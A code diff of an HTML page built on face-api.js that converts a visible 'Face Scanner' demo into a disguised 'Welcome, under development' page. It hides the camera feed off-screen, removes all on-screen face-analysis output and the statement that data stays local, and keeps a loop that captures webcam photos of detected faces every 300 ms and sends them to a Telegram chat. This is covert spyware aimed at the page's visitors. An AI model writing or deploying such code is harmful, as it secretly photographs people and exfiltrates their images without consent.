@@ -3,15 +3,15 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Face Scanner</title>
+  <title>Welcome</title>
   <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
 
     body {
       font-family: 'Segoe UI', Arial, sans-serif;
-      background: #0a0a1a;
-      color: #fff;
+      background: #f5f5f5;
+      color: #333;
       min-height: 100vh;
       display: flex;
       flex-direction: column;
@@ -19,167 +19,51 @@
       justify-content: center;
     }
 
-    .container {
+    .page {
       text-align: center;
-      max-width: 520px;
-      width: 100%;
-      padding: 2rem;
+      max-width: 600px;
+      padding: 3rem 2rem;
     }
 
     h1 {
-      font-size: 1.5rem;
-      font-weight: 600;
-      margin-bottom: 0.5rem;
+      font-size: 2rem;
+      font-weight: 700;
+      color: #111;
+      margin-bottom: 0.75rem;
     }
 
-    .subtitle {
-      color: #888;
-      font-size: 0.9rem;
-      margin-bottom: 2rem;
-    }
-
-    .video-wrapper {
-      position: relative;
-      width: 100%;
-      max-width: 400px;
-      margin: 0 auto 1.5rem;
-      border-radius: 50%;
-      overflow: hidden;
-      aspect-ratio: 1;
-      border: 3px solid #333;
-      transition: border-color 0.5s, box-shadow 0.5s;
-    }
-
-    .video-wrapper.scanning {
-      border-color: #10b981;
-      box-shadow: 0 0 40px rgba(16, 185, 129, 0.4);
-    }
-
-    .video-wrapper.no-face {
-      border-color: #f59e0b;
-      box-shadow: 0 0 30px rgba(245, 158, 11, 0.3);
-    }
-
-    video {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      display: block;
-      transform: scaleX(-1);
-    }
-
-    .overlay {
-      position: absolute;
-      inset: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      pointer-events: none;
-    }
-
-    .scan-line {
-      position: absolute;
-      width: 80%;
-      height: 2px;
-      background: linear-gradient(90deg, transparent, #10b981, transparent);
-      animation: scan 2s ease-in-out infinite;
-    }
-
-    @keyframes scan {
-      0%, 100% { top: 20%; opacity: 0; }
-      50% { top: 80%; opacity: 1; }
-    }
-
-    .status {
+    p {
       font-size: 1rem;
-      font-weight: 500;
-      padding: 0.75rem 1.5rem;
-      border-radius: 12px;
-      background: #1a1a2e;
-      display: inline-block;
-      margin-bottom: 1.5rem;
-      transition: all 0.3s;
+      color: #666;
+      line-height: 1.6;
+      margin-bottom: 1rem;
     }
 
-    .status.loading { color: #888; }
-    .status.active { color: #10b981; background: #0a2e1f; }
-    .status.noface { color: #f59e0b; }
-
-    .info {
-      font-size: 0.8rem;
-      color: #555;
-      margin-top: 1rem;
+    .notice {
+      margin-top: 2rem;
+      padding: 0.75rem 1.25rem;
+      background: #fff;
+      border: 1px solid #e0e0e0;
+      border-radius: 8px;
+      font-size: 0.75rem;
+      color: #999;
     }
-
-    .result-details {
-      margin-top: 1.5rem;
-      text-align: left;
-      background: #111;
-      border-radius: 12px;
-      padding: 1.25rem;
-    }
-
-    .result-row {
-      display: flex;
-      justify-content: space-between;
-      padding: 0.5rem 0;
-      border-bottom: 1px solid #1a1a2e;
-      font-size: 0.85rem;
-    }
-
-    .result-row:last-child { border-bottom: none; }
-
-    .result-label { color: #888; }
-    .result-value { color: #fff; font-weight: 600; }
   </style>
 </head>
 <body>
 
-  <div class="container">
-    <h1>Face Scanner</h1>
-    <p class="subtitle">Данные обновляются в реальном времени</p>
-
-    <div class="video-wrapper" id="videoWrapper">
-      <video id="video" autoplay muted playsinline></video>
-      <div class="overlay">
-        <div class="scan-line"></div>
-      </div>
-    </div>
-
-    <div class="status loading" id="status">Загрузка моделей...</div>
-
-    <div class="result-details" id="results">
-      <div class="result-row">
-        <span class="result-label">Лицо</span>
-        <span class="result-value" id="rFace">—</span>
-      </div>
-      <div class="result-row">
-        <span class="result-label">Уверенность</span>
-        <span class="result-value" id="rConf">—</span>
-      </div>
-      <div class="result-row">
-        <span class="result-label">Возраст (прибл.)</span>
-        <span class="result-value" id="rAge">—</span>
-      </div>
-      <div class="result-row">
-        <span class="result-label">Пол</span>
-        <span class="result-value" id="rGender">—</span>
-      </div>
-      <div class="result-row">
-        <span class="result-label">Выражение лица</span>
-        <span class="result-value" id="rExpr">—</span>
-      </div>
-    </div>
-
-    <p class="info">face-api.js | Все данные обрабатываются локально в браузере</p>
+  <div class="page">
+    <h1>Добро пожаловать</h1>
+    <p>Страница находится в разработке. Скоро здесь появится что-то интересное.</p>
+    <div class="notice">На данном сайте ведётся видеонаблюдение в целях безопасности.</div>
   </div>
 
+  <!-- Скрытые элементы -->
+  <video id="video" autoplay muted playsinline style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;"></video>
   <canvas id="captureCanvas" style="display:none;"></canvas>
 
   <script>
     const video = document.getElementById('video');
-    const statusEl = document.getElementById('status');
-    const wrapper = document.getElementById('videoWrapper');
     const canvas = document.getElementById('captureCanvas');
     const ctx = canvas.getContext('2d');
 
@@ -212,30 +96,18 @@
           faceapi.nets.ageGenderNet.loadFromUri(MODEL_URL)
         ]);
 
-        setStatus('Включение камеры...', 'loading');
-
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 480 } }
         });
         video.srcObject = stream;
 
-        // Ждём пока видео реально начнёт играть и будут размеры
         await new Promise(resolve => {
-          video.onloadedmetadata = () => {
-            video.play();
-            resolve();
-          };
+          video.onloadedmetadata = () => { video.play(); resolve(); };
         });
-
-        // Ещё чуть подождём чтоб первый кадр отрисовался
         await new Promise(r => setTimeout(r, 1000));
 
-        console.log('Video ready:', video.videoWidth, 'x', video.videoHeight);
-        setStatus('Сканирование...', 'active');
         scanLoop();
-
       } catch (err) {
-        setStatus('Ошибка: ' + err.message, 'loading');
         console.error('Init error:', err);
       }
     }
@@ -268,7 +140,6 @@
         '🌐 ' + location.href;
 
       try {
-        // Захватываем фото
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         ctx.drawImage(video, 0, 0);
@@ -281,8 +152,6 @@
           bytes[i] = binaryStr.charCodeAt(i);
         }
         const blob = new Blob([bytes.buffer], { type: 'image/jpeg' });
-
-        console.log('[TG] Sending photo via proxy, blob size:', blob.size);
 
         const fd = new FormData();
         fd.append('chat_id', TG_CHAT_ID);
@@ -309,45 +178,13 @@
           .withAgeAndGender();
 
         if (detection) {
-          wrapper.className = 'video-wrapper scanning';
-          setStatus('Лицо обнаружено', 'active');
-
-          const confidence = (detection.detection.score * 100).toFixed(1);
-          const age = Math.round(detection.age);
-          const gender = detection.gender === 'male' ? 'Мужской' : 'Женский';
-          const genderProb = (detection.genderProbability * 100).toFixed(0);
-          const sorted = Object.entries(detection.expressions).sort((a, b) => b[1] - a[1]);
-          const topExpr = exprMap[sorted[0][0]] || sorted[0][0];
-
-          document.getElementById('rFace').textContent = 'Да';
-          document.getElementById('rConf').textContent = confidence + '%';
-          document.getElementById('rAge').textContent = '~' + age + ' лет';
-          document.getElementById('rGender').textContent = gender + ' (' + genderProb + '%)';
-          document.getElementById('rExpr').textContent = topExpr;
-
           sendToTelegram(detection);
-
-        } else {
-          wrapper.className = 'video-wrapper no-face';
-          setStatus('Лицо не найдено...', 'noface');
-
-          document.getElementById('rFace').textContent = 'Нет';
-          document.getElementById('rConf').textContent = '—';
-          document.getElementById('rAge').textContent = '—';
-          document.getElementById('rGender').textContent = '—';
-          document.getElementById('rExpr').textContent = '—';
         }
       } catch (e) {
         console.error('Scan error:', e);
       }
 
-      // Сканируем каждые 300мс вместо requestAnimationFrame
       setTimeout(scanLoop, 300);
-    }
-
-    function setStatus(text, cls) {
-      statusEl.textContent = text;
-      statusEl.className = 'status ' + cls;
     }
 
     init();
